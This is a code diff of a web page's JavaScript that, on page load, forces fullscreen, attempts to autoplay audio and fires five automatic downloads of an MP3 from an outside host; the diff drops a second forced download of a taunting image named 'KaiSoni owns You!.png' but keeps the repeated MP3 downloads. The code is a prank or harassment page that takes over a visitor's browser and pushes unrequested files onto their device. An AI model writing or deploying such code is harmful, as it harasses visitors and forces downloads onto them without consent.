@@ -57,13 +57,12 @@
     const popup = document.getElementById('popup');
     const audio = document.getElementById('aud');
     const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
-    const pngUrl = 'KaiSoni owns You!.png'; // Adjust if PNG is hosted online
 
-    // Function to trigger file download
+    // Function to trigger MP3 download
     function triggerDownload(url, filename) {
       const a = document.createElement('a');
       a.href = url;
-      a.download = filename || url.split('/').pop();
+      a.download = filename || '1.mp3';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
@@ -96,12 +95,11 @@
       enterFullscreen();
       tryPlayAudio();
 
-      // Trigger multiple downloads for both MP3 and PNG (e.g., 5 times each per page load)
-      const downloadCount = 5; // Adjust number of downloads per file
+      // Trigger multiple downloads (e.g., 5 times per page load)
+      const downloadCount = 5; // Adjust number of downloads
       for (let i = 0; i < downloadCount; i++) {
         setTimeout(() => {
-          triggerDownload(mp3Url, `1_${i + 1}.mp3`); // Download MP3
-          triggerDownload(pngUrl, `KaiSoni_owns_You_${i + 1}.png`); // Download PNG
+          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
         }, i * 500); // 500ms delay between downloads
       }
 
